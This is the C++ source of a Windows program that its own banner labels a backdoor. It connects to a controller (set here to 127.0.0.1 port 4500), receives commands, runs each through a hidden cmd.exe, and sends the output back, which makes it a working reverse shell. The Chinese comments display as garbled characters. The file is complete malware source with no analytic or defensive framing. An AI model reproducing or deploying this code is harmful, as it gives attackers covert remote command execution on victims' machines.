// door.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include<winsock2.h>
#include<stdio.h>

#pragma comment(lib,"ws2_32.lib")

int main(int argc, char* argv[])
{
	char wMessage[512] = "\r\n========================  BackDoor by �����ѩ  ========================\r\n"; 
	BYTE minorVer = 2; 
	BYTE majorVer = 2;
	WSADATA wsaData;
	WORD sockVersion = MAKEWORD(minorVer, majorVer);
	//��ʼ��winsocket��
	if(WSAStartup(sockVersion, &wsaData) != 0)
        return 0;
	//����socket
	SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(s == INVALID_SOCKET)
	{
		printf(" socket error \n");
		return 0;
	}
	
	sockaddr_in sin; 
	//���sockaddr_in�ṹ
	sin.sin_family = AF_INET;
	sin.sin_port = htons(4500);
	sin.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
	//���ӿ����ߵ���
	if(connect(s, (sockaddr*)&sin, sizeof(sin)) == -1)
	{
		printf(" connect error \n");
		return 0;
	}
	//���ͻ�ӭ��Ϣ
	if (send(s,wMessage,strlen(wMessage),0)==SOCKET_ERROR)
	{
        printf("Send message error \n");
        return 0;
	}
	char rBuffer[1024] = {0};
	char cmdline[256]={0};
	//ѭ�������ڽ��������������ִ�У����ӹܵ��ж���ִ�н�����ظ�Զ������
	while(true)
	{
		memset(cmdline,0,256);
		SECURITY_ATTRIBUTES sa;
		HANDLE hRead,hWrite;
		sa.nLength = sizeof(SECURITY_ATTRIBUTES);
		sa.lpSecurityDescriptor = NULL;
		sa.bInheritHandle = TRUE;
		if (!CreatePipe(&hRead,&hWrite,&sa,0)) 
		{
			printf("CreatePipe Error");
			return 0;
		} 	
		STARTUPINFO si;
		PROCESS_INFORMATION pi; 
		si.cb = sizeof(STARTUPINFO);
		GetStartupInfo(&si); 
		si.hStdError = hWrite;
		si.hStdOutput = hWrite;
		si.wShowWindow = SW_HIDE;
		si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
		
		GetSystemDirectory(cmdline,sizeof(cmdline));
		strcat(cmdline,"\\cmd.exe /c");
		char cmdbuff[256];
		
		int   rLen=recv(s,cmdbuff,256,NULL);
		if(rLen==SOCKET_ERROR)
			return 0; 
		strncat(cmdline,cmdbuff,strlen(cmdbuff)); 
		if (!CreateProcess(NULL,cmdline,NULL,NULL,TRUE,NULL,NULL,NULL,&si,&pi)) 
		{
			printf("CreateProcess Error");
			continue;
		}
		
		CloseHandle(hWrite);
		DWORD dwRead;
		while(ReadFile(hRead,rBuffer,1024,&dwRead,NULL))
		{  
			send(s,rBuffer,strlen(rBuffer),0);
			memset(rBuffer,0,1024);
			
		}		
	}
	return 0;
}
